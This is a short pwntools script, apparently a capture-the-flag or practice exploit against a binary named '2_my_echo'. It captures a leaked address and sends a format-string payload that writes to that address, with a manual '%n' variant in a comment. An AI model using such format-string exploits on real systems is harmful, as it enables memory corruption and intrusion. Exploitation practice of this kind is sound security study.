from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./2_my_echo"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("address ")
leak = int(p.recvline()[:-1], 16)
print(leak)
log.info(str(leak))
payload = fmtstr_payload(7, {leak: 1})
#payload = pack(leak) + b"%10x%7$n"
p.sendline(payload)

p.interactive()
